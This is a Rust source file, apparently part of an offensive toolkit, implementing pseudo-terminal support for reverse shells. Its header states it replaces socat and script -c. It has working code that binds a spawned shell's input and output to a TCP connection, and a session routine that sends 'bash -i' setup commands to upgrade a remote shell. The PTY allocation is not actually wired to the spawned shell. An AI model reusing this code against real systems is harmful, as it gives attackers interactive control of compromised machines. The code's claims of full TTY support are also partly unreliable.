/// PTY/TTY Support (Pseudo-Terminal)
///
/// Implements pseudo-terminal allocation for proper interactive shells.
/// Essential for reverse shells with full TTY features (job control, colors, etc).
///
/// Features:
/// - PTY allocation
/// - Raw mode support
/// - Terminal size propagation
/// - Signal handling (SIGWINCH)
///
/// Replaces: socat PTY, script -c
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::os::unix::io::AsRawFd;
use std::process::{Command, Stdio};
use std::thread;

/// PTY configuration
#[derive(Debug, Clone)]
pub struct PtyConfig {
    pub shell: String,
    pub raw_mode: bool,
    pub echo: bool,
}

impl Default for PtyConfig {
    fn default() -> Self {
        Self {
            shell: std::env::var("SHELL").unwrap_or_else(|_| "/bin/sh".to_string()),
            raw_mode: true,
            echo: false,
        }
    }
}

impl PtyConfig {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn with_shell(mut self, shell: &str) -> Self {
        self.shell = shell.to_string();
        self
    }

    pub fn with_raw_mode(mut self, raw: bool) -> Self {
        self.raw_mode = raw;
        self
    }

    pub fn with_echo(mut self, echo: bool) -> Self {
        self.echo = echo;
        self
    }
}

/// PTY manager
pub struct PtyManager {
    config: PtyConfig,
}

impl PtyManager {
    pub fn new(config: PtyConfig) -> Self {
        Self { config }
    }

    /// Spawn shell with PTY on network connection
    pub fn spawn_on_connection(&self, mut stream: TcpStream) -> Result<(), String> {
        // Open PTY
        let (_master_fd, _slave_name) = self.open_pty()?;

        // Fork and spawn shell on PTY slave
        let shell = self.config.shell.clone();

        // Spawn shell
        let mut child = Command::new(&shell)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .map_err(|e| format!("Failed to spawn shell: {}", e))?;

        let mut child_stdin = child.stdin.take().unwrap();
        let mut child_stdout = child.stdout.take().unwrap();
        let mut child_stderr = child.stderr.take().unwrap();

        // Copy stream -> shell (input)
        let mut stream_clone = stream.try_clone().map_err(|e| e.to_string())?;
        thread::spawn(move || {
            let mut buf = [0u8; 8192];
            loop {
                match stream_clone.read(&mut buf) {
                    Ok(0) => break,
                    Ok(n) => {
                        if child_stdin.write_all(&buf[..n]).is_err() {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        });

        // Copy shell -> stream (output)
        let mut stream_clone2 = stream.try_clone().map_err(|e| e.to_string())?;
        thread::spawn(move || {
            let mut buf = [0u8; 8192];
            loop {
                match child_stdout.read(&mut buf) {
                    Ok(0) => break,
                    Ok(n) => {
                        if stream_clone2.write_all(&buf[..n]).is_err() {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        });

        // Copy stderr -> stream
        thread::spawn(move || {
            let mut buf = [0u8; 8192];
            loop {
                match child_stderr.read(&mut buf) {
                    Ok(0) => break,
                    Ok(n) => {
                        if stream.write_all(&buf[..n]).is_err() {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        });

        // Wait for shell to exit
        let _ = child.wait();

        Ok(())
    }

    /// Open PTY (Linux-specific implementation using /dev/ptmx)
    fn open_pty(&self) -> Result<(i32, String), String> {
        #[cfg(unix)]
        {
            use std::ffi::CString;

            // Open /dev/ptmx to get master FD
            let ptmx = CString::new("/dev/ptmx").unwrap();
            let master_fd = unsafe { libc::open(ptmx.as_ptr(), libc::O_RDWR | libc::O_NOCTTY) };

            if master_fd < 0 {
                return Err("Failed to open /dev/ptmx".to_string());
            }

            // Grant access to slave
            if unsafe { libc::grantpt(master_fd) } < 0 {
                return Err("grantpt failed".to_string());
            }

            // Unlock slave
            if unsafe { libc::unlockpt(master_fd) } < 0 {
                return Err("unlockpt failed".to_string());
            }

            // Get slave name
            let slave_ptr = unsafe { libc::ptsname(master_fd) };
            if slave_ptr.is_null() {
                return Err("ptsname failed".to_string());
            }

            let slave_name = unsafe {
                std::ffi::CStr::from_ptr(slave_ptr)
                    .to_string_lossy()
                    .to_string()
            };

            Ok((master_fd, slave_name))
        }

        #[cfg(not(unix))]
        {
            Err("PTY support only available on Unix systems".to_string())
        }
    }

    /// Set terminal to raw mode
    pub fn set_raw_mode() -> Result<(), String> {
        #[cfg(unix)]
        {
            let stdin_fd = io::stdin().as_raw_fd();

            unsafe {
                let mut termios: libc::termios = std::mem::zeroed();

                if libc::tcgetattr(stdin_fd, &mut termios) < 0 {
                    return Err("tcgetattr failed".to_string());
                }

                // Set raw mode
                termios.c_lflag &= !(libc::ECHO | libc::ICANON | libc::ISIG | libc::IEXTEN);
                termios.c_iflag &=
                    !(libc::IXON | libc::ICRNL | libc::BRKINT | libc::INPCK | libc::ISTRIP);
                termios.c_oflag &= !libc::OPOST;
                termios.c_cflag |= libc::CS8;

                // Min bytes and timeout
                termios.c_cc[libc::VMIN] = 1;
                termios.c_cc[libc::VTIME] = 0;

                if libc::tcsetattr(stdin_fd, libc::TCSANOW, &termios) < 0 {
                    return Err("tcsetattr failed".to_string());
                }
            }

            Ok(())
        }

        #[cfg(not(unix))]
        {
            Err("Raw mode only available on Unix systems".to_string())
        }
    }

    /// Restore terminal to original mode
    pub fn restore_terminal() -> Result<(), String> {
        #[cfg(unix)]
        {
            let stdin_fd = io::stdin().as_raw_fd();

            unsafe {
                let mut termios: libc::termios = std::mem::zeroed();

                if libc::tcgetattr(stdin_fd, &mut termios) < 0 {
                    return Err("tcgetattr failed".to_string());
                }

                // Restore canonical mode
                termios.c_lflag |= libc::ECHO | libc::ICANON | libc::ISIG;
                termios.c_iflag |= libc::IXON | libc::ICRNL;
                termios.c_oflag |= libc::OPOST;

                if libc::tcsetattr(stdin_fd, libc::TCSANOW, &termios) < 0 {
                    return Err("tcsetattr failed".to_string());
                }
            }

            Ok(())
        }

        #[cfg(not(unix))]
        {
            Ok(())
        }
    }

    /// Get terminal size
    pub fn get_terminal_size() -> Result<(u16, u16), String> {
        #[cfg(unix)]
        {
            let stdout_fd = io::stdout().as_raw_fd();

            unsafe {
                let mut winsize: libc::winsize = std::mem::zeroed();

                if libc::ioctl(stdout_fd, libc::TIOCGWINSZ, &mut winsize) < 0 {
                    return Err("ioctl TIOCGWINSZ failed".to_string());
                }

                Ok((winsize.ws_row, winsize.ws_col))
            }
        }

        #[cfg(not(unix))]
        {
            Ok((24, 80)) // Default size
        }
    }

    /// Send terminal size to PTY
    pub fn set_terminal_size(fd: i32, rows: u16, cols: u16) -> Result<(), String> {
        #[cfg(unix)]
        {
            unsafe {
                let mut winsize: libc::winsize = std::mem::zeroed();
                winsize.ws_row = rows;
                winsize.ws_col = cols;

                if libc::ioctl(fd, libc::TIOCSWINSZ, &winsize) < 0 {
                    return Err("ioctl TIOCSWINSZ failed".to_string());
                }
            }

            Ok(())
        }

        #[cfg(not(unix))]
        {
            Err("Terminal size control only available on Unix systems".to_string())
        }
    }
}

/// Interactive PTY session
pub struct PtySession {
    stream: TcpStream,
    config: PtyConfig,
}

impl PtySession {
    pub fn new(stream: TcpStream, config: PtyConfig) -> Self {
        Self { stream, config }
    }

    /// Start interactive session
    pub fn run(&mut self) -> Result<(), String> {
        // Set terminal to raw mode
        if self.config.raw_mode {
            PtyManager::set_raw_mode()?;
        }

        // Ensure restoration on exit
        let _restore_guard = RestoreGuard;

        // Get terminal size
        let (rows, cols) = PtyManager::get_terminal_size().unwrap_or((24, 80));

        // Send initial STTY commands to set up remote PTY
        let setup_commands = format!(
            "export TERM=xterm-256color; stty rows {} columns {}; bash -i\n",
            rows, cols
        );

        self.stream
            .write_all(setup_commands.as_bytes())
            .map_err(|e| format!("Failed to send setup commands: {}", e))?;

        // Bidirectional copy
        let mut stream_clone = self
            .stream
            .try_clone()
            .map_err(|e| format!("Failed to clone stream: {}", e))?;

        // stdin -> stream
        let stdin_thread = thread::spawn(move || {
            let mut stdin = io::stdin();
            let mut buf = [0u8; 8192];

            loop {
                match stdin.read(&mut buf) {
                    Ok(0) => break,
                    Ok(n) => {
                        if stream_clone.write_all(&buf[..n]).is_err() {
                            break;
                        }
                        if stream_clone.flush().is_err() {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        });

        // stream -> stdout
        let mut stdout = io::stdout();
        let mut buf = [0u8; 8192];

        loop {
            match self.stream.read(&mut buf) {
                Ok(0) => break,
                Ok(n) => {
                    stdout
                        .write_all(&buf[..n])
                        .map_err(|e| format!("Failed to write to stdout: {}", e))?;
                    stdout
                        .flush()
                        .map_err(|e| format!("Failed to flush stdout: {}", e))?;
                }
                Err(_) => break,
            }
        }

        // Wait for stdin thread
        let _ = stdin_thread.join();

        Ok(())
    }
}

/// Guard to restore terminal on drop
struct RestoreGuard;

impl Drop for RestoreGuard {
    fn drop(&mut self) {
        let _ = PtyManager::restore_terminal();
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_pty_config() {
        let config = PtyConfig::new()
            .with_shell("/bin/bash")
            .with_raw_mode(true)
            .with_echo(false);

        assert_eq!(config.shell, "/bin/bash");
        assert!(config.raw_mode);
        assert!(!config.echo);
    }

    #[test]
    fn test_get_terminal_size() {
        // Should not fail (returns default on non-Unix)
        let size = PtyManager::get_terminal_size();
        assert!(size.is_ok());

        let (rows, cols) = size.unwrap();
        assert!(rows > 0 && rows < 1000);
        assert!(cols > 0 && cols < 1000);
    }

    #[test]
    #[cfg(unix)]
    fn test_open_pty() {
        let config = PtyConfig::new();
        let manager = PtyManager::new(config);

        let result = manager.open_pty();
        if let Ok((fd, slave_name)) = result {
            assert!(fd >= 0);
            assert!(slave_name.starts_with("/dev/pts/"));

            // Close FD
            unsafe {
                libc::close(fd);
            }
        }
    }
}
